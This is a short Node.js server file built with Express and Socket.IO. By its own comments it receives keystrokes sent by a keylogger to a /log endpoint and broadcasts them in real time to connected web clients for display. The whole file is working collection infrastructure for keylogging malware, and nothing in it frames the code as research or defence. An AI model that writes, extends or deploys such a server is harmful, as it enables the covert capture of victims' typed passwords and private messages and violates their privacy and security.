const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const bodyParser = require('body-parser');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

const port = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public')); // Serve static files from the 'public' directory

// Route to receive keystrokes from the keylogger
app.post('/log', (req, res) => {
    const keystroke = req.body.key;
    
    // Emit the keystroke to all connected clients
    io.emit('keystroke', keystroke);
    
    res.send('Keystroke received');
});

// Serve the web page that will display keystrokes
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

// Handle Socket.IO connections
io.on('connection', (socket) => {
    console.log('A user connected');
    
    socket.on('disconnect', () => {
        console.log('A user disconnected');
    });
});

// Start the server
server.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
